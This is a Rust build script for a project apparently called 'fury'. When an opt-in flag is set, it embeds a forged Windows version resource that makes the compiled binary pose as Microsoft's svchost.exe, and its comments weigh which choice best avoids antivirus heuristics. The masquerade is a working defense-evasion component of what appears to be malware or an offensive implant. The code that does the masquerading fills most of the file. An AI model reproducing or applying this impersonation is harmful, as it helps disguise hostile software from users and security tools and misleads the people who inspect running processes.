fn main() {
    // Version-info resource is opt-in (FURY_MASQ=1): impersonating Microsoft
    // branding on an unsigned binary is itself a common AV heuristic, so the
    // default build carries no version block at all.
    let target = std::env::var("TARGET").unwrap_or_default();
    let masq = std::env::var("FURY_MASQ").map(|v| v == "1").unwrap_or(false);
    if target.contains("windows") && masq {
        println!("cargo:rerun-if-changed=build.rs");
        std::fs::write(
            format!("{}/fury.rc", std::env::var("OUT_DIR").unwrap()),
            r#"1 VERSIONINFO
FILEVERSION 10,0,19041,3636
PRODUCTVERSION 10,0,19041,3636
FILEOS 0x40004
FILETYPE 0x1
BEGIN
  BLOCK "StringFileInfo"
  BEGIN
    BLOCK "040904B0"
    BEGIN
      VALUE "CompanyName", "Microsoft Corporation"
      VALUE "FileDescription", "Service Host"
      VALUE "FileVersion", "10.0.19041.3636 (WinBuild.160101.0800)"
      VALUE "InternalName", "svchost"
      VALUE "OriginalFilename", "svchost.exe"
      VALUE "ProductName", "Microsoft Windows Operating System"
      VALUE "ProductVersion", "10.0.19041.3636"
    END
  END
END
"#,
        )
        .unwrap();
        // compile the .rc into a .o and link it
        let out_dir = std::env::var("OUT_DIR").unwrap();
        let rc = format!("{}/fury.rc", out_dir);
        let obj = format!("{}/furyres.o", out_dir);
        let windres = if target.contains("x86_64") {
            "x86_64-w64-mingw32-windres"
        } else {
            "i686-w64-mingw32-windres"
        };
        let status = std::process::Command::new(windres)
            .arg(&rc)
            .arg("-O")
            .arg("coff")
            .arg("-o")
            .arg(&obj)
            .status()
            .expect("windres failed to start");
        if !status.success() {
            panic!("windres failed");
        }
        println!("cargo:rustc-link-search=native={}", out_dir);
        println!("cargo:rustc-link-lib=static=furyres");
        // windres produces furyres.o; rename to libfuryres.a style for the linker
        let lib = format!("{}/libfuryres.a", out_dir);
        let _ = std::fs::rename(&obj, &lib);
    }
}
